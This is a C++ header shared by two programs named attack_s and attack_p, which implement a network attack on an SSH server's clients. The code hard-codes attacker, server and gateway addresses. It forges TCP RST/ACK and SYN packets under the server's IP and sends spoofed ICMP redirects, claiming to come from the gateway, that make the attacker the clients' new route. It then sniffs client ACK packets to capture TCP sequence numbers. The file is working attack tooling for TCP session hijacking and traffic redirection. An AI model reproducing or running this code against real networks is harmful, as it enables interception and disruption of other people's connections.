#pragma once

#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <atomic>
#include <thread>
#include <mutex>
#include <memory>
#include <chrono>
#include <random>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <tins/tins.h>

using namespace std;
using namespace Tins;

// ---- CONFIG ----
const string   ATTACKER_IP       = "192.168.1.2";
const string   SERVER_IP         = "20.0.0.5";
const uint16_t SERVER_PORT       = 22;
const string   GATEWAY_IP        = "192.168.1.1";
const string   GATEWAY_MAC       = "c4:41:1e:ce:07:40";  // fallback dst MAC if ARP fails
const string   NEW_GW_IP         = "192.168.1.2";           // ICMP redirect new gateway (attacker)
const string   REDIRECT_SRC_MAC  = "f4:6d:3f:b0:29:e4";   // src MAC in ICMP redirect Ethernet frame
                                         // empty = spoof as gateway MAC; set to override
const string   IFACE             = "wlp0s20f3";
const int NAT_CLEAR_WAIT  = 11;
const int SYN_WAIT        = 1;
const int INTER_BLOCK_WAIT = 1;
const int SNIFF_WAIT      = 10;
// ----------------

struct Host {
    string ip;
    string mac;
};

struct ProbeResult {
    atomic<bool>     syn_ack{false};
    atomic<bool>     c_ack{false};
    atomic<uint32_t> c_ack_ack{0};
};

// ------------------------------------------------------------------ helpers --

// Thread-safe cout: each binary (attack_s / attack_p) gets one copy of this
// mutex since they each compile common.h into a single translation unit.
static mutex g_log_mtx;
inline void println(const string& s) {
    lock_guard<mutex> lk(g_log_mtx);
    cout << s << "\n";
}

// Thread-safe RNG: each thread gets its own engine seeded from random_device.
// Avoids the data race on rand()'s global state when called from parallel port threads.
inline uint32_t rand32() {
    thread_local mt19937 rng(random_device{}());
    return uniform_int_distribution<uint32_t>{}(rng);
}

inline vector<string> subnet_hosts(const string& attacker_ip, int prefix) {
    in_addr a;
    inet_aton(attacker_ip.c_str(), &a);
    uint32_t ip    = ntohl(a.s_addr);
    uint32_t mask  = prefix ? (~0u << (32 - prefix)) : 0;
    uint32_t net   = ip & mask;
    uint32_t bcast = net | ~mask;
    vector<string> out;
    for (uint32_t h = net + 1; h < bcast; h++) {
        if (h == ip) continue;   // skip attacker itself
        in_addr tmp; tmp.s_addr = htonl(h);
        out.push_back(inet_ntoa(tmp));
    }
    return out;
}

inline vector<Host> load_hosts(const string& path) {
    vector<Host> hosts;
    ifstream f(path);
    string line;
    while (getline(f, line)) {
        if (line.empty()) continue;
        istringstream ss(line);
        string mac, ip;
        if (!getline(ss, mac, ',') || !getline(ss, ip)) continue;
        while (!mac.empty() && isspace((unsigned char)mac.back())) mac.pop_back();
        while (!ip.empty()  && isspace((unsigned char)ip.front()))  ip.erase(ip.begin());
        hosts.push_back({ip, mac});
    }
    return hosts;
}

inline vector<uint16_t> load_ports(const string& path) {
    vector<uint16_t> ports;
    ifstream f(path);
    string line;
    while (getline(f, line))
        if (!line.empty()) ports.push_back((uint16_t)stoi(line));
    return ports;
}

inline string arp_cache(const string& ip) {
    ifstream f("/proc/net/arp");
    string line;
    getline(f, line);
    while (getline(f, line)) {
        istringstream ss(line);
        string eip, hwt, flags, mac;
        ss >> eip >> hwt >> flags >> mac;
        if (eip == ip && mac != "00:00:00:00:00:00") return mac;
    }
    return "";
}

// Single-threaded MAC resolution (used for gateway and in attack_s).
// For attack_p use the inline block resolver in port_worker.
inline string resolve_mac(const string& ip, NetworkInterface& iface, PacketSender& sender) {
    string cached = arp_cache(ip);
    if (!cached.empty()) return cached;
    try {
        EthernetII req = ARP::make_arp_request(
            IPv4Address(ip), iface.ipv4_address(), iface.hw_address());
        unique_ptr<PDU> reply(sender.send_recv(req, iface));
        if (reply)
            return reply->rfind_pdu<ARP>().sender_hw_addr().to_string();
    } catch (...) {}
    cout << "    [ARP] no reply from " << ip << ", using gateway MAC\n";
    return GATEWAY_MAC;
}

// --------------------------------------------------------------- packet ops --

inline void rst_block(const vector<Host>& block, uint16_t port,
                      NetworkInterface& iface, PacketSender& sender,
                      const string& self_mac, const string& gw_mac) {
    for (const auto& h : block) {
        EthernetII pkt =
            EthernetII(HWAddress<6>(gw_mac), HWAddress<6>(self_mac)) /
            IP(IPv4Address(SERVER_IP), IPv4Address(h.ip)) /
            TCP(SERVER_PORT, port);
        auto& tcp = pkt.rfind_pdu<TCP>();
        tcp.set_flag(TCP::RST, 1);
        tcp.set_flag(TCP::ACK, 1);
        tcp.seq(rand32());
        tcp.ack_seq(rand32());
        sender.send(pkt, iface);
    }
}

inline void syn_probe(uint16_t port, NetworkInterface& iface, PacketSender& sender,
                      const string& self_mac, const string& gw_mac) {
    EthernetII pkt =
        EthernetII(HWAddress<6>(gw_mac), HWAddress<6>(self_mac)) /
        IP(IPv4Address(SERVER_IP), IPv4Address(ATTACKER_IP)) /
        TCP(SERVER_PORT, port);
    auto& tcp = pkt.rfind_pdu<TCP>();
    tcp.set_flag(TCP::SYN, 1);
    tcp.seq(rand32());
    sender.send(pkt, iface);
}

// 28-byte ICMP redirect inner payload:
//   20-byte IP header (src=client, dst=server, proto=TCP, len=28)
// +  8-byte TCP stub  (sport | dport | seq)
inline vector<uint8_t> redirect_payload(const string& client_ip,
                                        uint16_t sport, uint32_t seq) {
    vector<uint8_t> buf(28, 0);
    buf[0] = 0x45; buf[2] = 0; buf[3] = 28;
    buf[6] = 0x40; buf[8] = 64; buf[9] = 6;
    in_addr src, dst;
    inet_aton(client_ip.c_str(), &src);
    inet_aton(SERVER_IP.c_str(), &dst);
    memcpy(&buf[12], &src.s_addr, 4);
    memcpy(&buf[16], &dst.s_addr, 4);
    // IP checksum
    uint32_t sum = 0;
    for (int i = 0; i < 20; i += 2) sum += (buf[i] << 8) | buf[i+1];
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    uint16_t ck = ~(uint16_t)sum;
    buf[10] = ck >> 8; buf[11] = ck & 0xff;
    // TCP stub
    uint16_t sp = htons(sport), dp = htons(SERVER_PORT);
    uint32_t sq = htonl(seq);
    memcpy(&buf[20], &sp, 2); memcpy(&buf[22], &dp, 2); memcpy(&buf[24], &sq, 4);
    return buf;
}

// mac_map: ip -> mac for clients in block (caller owns locking if needed)
inline void icmp_redirect(const vector<Host>& block, uint16_t port, uint32_t seq,
                          NetworkInterface& iface, PacketSender& sender,
                          const string& self_mac, const string& gw_mac,
                          const map<string,string>& mac_map) {
    const string& src_mac = REDIRECT_SRC_MAC.empty() ? self_mac : REDIRECT_SRC_MAC;
    for (const auto& h : block) {
        auto it = mac_map.find(h.ip);
        const string& dst_mac = (it != mac_map.end()) ? it->second : gw_mac;
        auto payload = redirect_payload(h.ip, port, seq);

        ICMP icmp_pdu;
        icmp_pdu.type(ICMP::REDIRECT);
        icmp_pdu.code(1);
        icmp_pdu.gateway(IPv4Address(NEW_GW_IP));

        EthernetII pkt =
            EthernetII(HWAddress<6>(dst_mac), HWAddress<6>(src_mac)) /
            IP(IPv4Address(h.ip), IPv4Address(GATEWAY_IP)) /
            icmp_pdu /
            RawPDU(payload.data(), payload.size());

        sender.send(pkt, iface);
        {
            ostringstream os;
            os << "    [REDIRECT] -> " << h.ip << " (MAC " << dst_mac
               << ")  seq=" << seq;
            println(os.str());
        }
    }
}

// ----------------------------------------------------------- timing helper --

inline int64_t ts_ms() {
    static auto t0 = chrono::steady_clock::now();
    return chrono::duration_cast<chrono::milliseconds>(
        chrono::steady_clock::now() - t0).count();
}

// Returns "[+NNNms] " prefix for log lines.
inline string ts() {
    ostringstream os;
    os << "[+" << ts_ms() << "ms] ";
    return os.str();
}

// ----------------------------------------------------------------- sniffers --

// BPF filter helpers
inline string probe_filter(uint16_t port) {
    return "tcp and src host " + SERVER_IP +
           " and src port "    + to_string(SERVER_PORT) +
           " and dst host "    + ATTACKER_IP +
           " and dst port "    + to_string(port);
}
inline string capture_filter(uint16_t port) {
    return "tcp and dst host " + SERVER_IP +
           " and src port "    + to_string(port) +
           " and dst port "    + to_string(SERVER_PORT) +
           " and (tcp[13] & 16 != 0) and (tcp[13] & 4 == 0)";
}
inline string probe_block_filter() {
    return "tcp and src host " + SERVER_IP + " and dst host " + ATTACKER_IP;
}
inline string capture_ports_filter(const vector<uint16_t>& ports) {
    string expr;
    for (size_t i = 0; i < ports.size(); i++) {
        if (i) expr += " or ";
        expr += "src port " + to_string(ports[i]);
    }
    return "tcp and dst host " + SERVER_IP +
           " and (" + expr + ") and dst port " + to_string(SERVER_PORT) +
           " and (tcp[13] & 16 != 0) and (tcp[13] & 4 == 0)";
}
inline SnifferConfiguration sniffer_cfg(const string& filter) {
    SnifferConfiguration cfg;
    cfg.set_filter(filter);
    cfg.set_immediate_mode(true);
    cfg.set_timeout(200);
    return cfg;
}

// Sniffer is created by caller; caller calls sn.stop_sniff() to terminate.
// probe_listen returns on first SYN-ACK or c-ACK, or when stop_sniff() fires.
inline void probe_listen(Sniffer& sn, ProbeResult& result, atomic<bool>& stop) {
    while (!stop) {
        unique_ptr<PDU> pdu(sn.next_packet());
        if (!pdu) continue;
        try {
            const TCP& tcp = pdu->rfind_pdu<TCP>();
            auto flags = tcp.flags();
            if ((flags & TCP::SYN) && (flags & TCP::ACK)) {
                result.syn_ack = true; return;
            }
            if ((flags & TCP::ACK) && !(flags & TCP::SYN)) {
                result.c_ack     = true;
                result.c_ack_ack = tcp.ack_seq();
                return;
            }
        } catch (...) {}
    }
}

// -------------------------------------------- block-level probe and capture --

struct BlockProbeResult {
    map<uint16_t, uint32_t> c_acks;   // port -> first c-ACK ack value seen
    set<uint16_t>           syn_acks; // ports that received a SYN-ACK
};

// Sniffer is created by caller with probe_block_filter(); caller calls stop_sniff().
inline BlockProbeResult probe_block(Sniffer& sn, const vector<uint16_t>& ports,
                                    atomic<bool>& stop) {
    set<uint16_t> port_set(ports.begin(), ports.end());
    BlockProbeResult result;
    while (!stop) {
        unique_ptr<PDU> pdu(sn.next_packet());
        if (!pdu) continue;
        try {
            const TCP& tcp = pdu->rfind_pdu<TCP>();
            uint16_t dport = tcp.dport();
            if (!port_set.count(dport)) continue;
            auto flags = tcp.flags();
            if ((flags & TCP::SYN) && (flags & TCP::ACK)) {
                result.syn_acks.insert(dport);
            } else if ((flags & TCP::ACK) && !(flags & TCP::SYN)) {
                if (!result.c_acks.count(dport))
                    result.c_acks[dport] = tcp.ack_seq();
            }
        } catch (...) {}
    }
    return result;
}

// Spawn a self-contained capture session for one port.
// Returns immediately; the thread runs for sniff_wait seconds then exits.
// Captured packets printed to terminal and appended to log file.
inline thread spawn_capture(const vector<Host>& block, uint16_t port,
                             int sniff_wait, ofstream& log, mutex& log_mtx) {
    return thread([block, port, sniff_wait, &log, &log_mtx]() {
        Sniffer sn(IFACE, sniffer_cfg(capture_filter(port)));
        atomic<bool> stop{false};
        thread timer([&sn, &stop, sniff_wait]() {
            this_thread::sleep_for(chrono::seconds(sniff_wait));
            stop = true;
            sn.stop_sniff();
        });
        set<string> ips;
        for (const auto& h : block) ips.insert(h.ip);
        while (!stop) {
            unique_ptr<PDU> pdu(sn.next_packet());
            if (!pdu) continue;
            try {
                const IP&  ip  = pdu->rfind_pdu<IP>();
                const TCP& tcp = pdu->rfind_pdu<TCP>();
                if (!ips.count(ip.src_addr().to_string())) continue;
                ostringstream os;
                os << ts() << "[CAPTURED] port=" << port
                   << " " << ip.src_addr() << ":" << tcp.sport()
                   << " -> " << ip.dst_addr() << ":" << tcp.dport()
                   << " flags=0x" << hex << (int)tcp.flags()
                   << " seq=" << dec << tcp.seq() << " ack=" << tcp.ack_seq();
                println(os.str());
                lock_guard<mutex> lk(log_mtx);
                log << os.str() << "\n";
                log.flush();
            } catch (...) {}
        }
        timer.join();
    });
}

// Spawn a self-contained capture session for multiple ports (used by attack_p).
inline thread spawn_capture_ports(const vector<Host>& block, const vector<uint16_t>& ports,
                                   int sniff_wait, ofstream& log, mutex& log_mtx) {
    return thread([block, ports, sniff_wait, &log, &log_mtx]() {
        if (ports.empty()) return;
        Sniffer sn(IFACE, sniffer_cfg(capture_ports_filter(ports)));
        atomic<bool> stop{false};
        thread timer([&sn, &stop, sniff_wait]() {
            this_thread::sleep_for(chrono::seconds(sniff_wait));
            stop = true;
            sn.stop_sniff();
        });
        set<string> ips;
        for (const auto& h : block) ips.insert(h.ip);
        while (!stop) {
            unique_ptr<PDU> pdu(sn.next_packet());
            if (!pdu) continue;
            try {
                const IP&  ip  = pdu->rfind_pdu<IP>();
                const TCP& tcp = pdu->rfind_pdu<TCP>();
                if (!ips.count(ip.src_addr().to_string())) continue;
                ostringstream os;
                os << ts() << "[CAPTURED]"
                   << " " << ip.src_addr() << ":" << tcp.sport()
                   << " -> " << ip.dst_addr() << ":" << tcp.dport()
                   << " flags=0x" << hex << (int)tcp.flags()
                   << " seq=" << dec << tcp.seq() << " ack=" << tcp.ack_seq();
                println(os.str());
                lock_guard<mutex> lk(log_mtx);
                log << os.str() << "\n";
                log.flush();
            } catch (...) {}
        }
        timer.join();
    });
}

// ------------------------------------------------ gateway-bouncing redirect --

// Like icmp_redirect() but dst MAC is always gw_mac — no per-client ARP needed.
// Gateway forwards to each client based on the IP layer dst.
// Eth src = self_mac (attacker). REDIRECT_SRC_MAC is not used here — gateway
// drops frames whose src MAC matches its own MAC (loop detection).
inline void icmp_redirect_gw(const vector<Host>& block, uint16_t port, uint32_t seq,
                              NetworkInterface& iface, PacketSender& sender,
                              const string& self_mac, const string& gw_mac) {
    const string& src_mac = self_mac;
    for (const auto& h : block) {
        auto payload = redirect_payload(h.ip, port, seq);
        ICMP icmp_pdu;
        icmp_pdu.type(ICMP::REDIRECT);
        icmp_pdu.code(1);
        icmp_pdu.gateway(IPv4Address(NEW_GW_IP));
        EthernetII pkt =
            EthernetII(HWAddress<6>(gw_mac), HWAddress<6>(src_mac)) /
            IP(IPv4Address(h.ip), IPv4Address(GATEWAY_IP)) /
            icmp_pdu /
            RawPDU(payload.data(), payload.size());
        sender.send(pkt, iface);
        {
            ostringstream os;
            os << "    [REDIRECT-GW] -> " << h.ip << " (via " << gw_mac << ")  seq=" << seq;
            println(os.str());
        }
    }
}
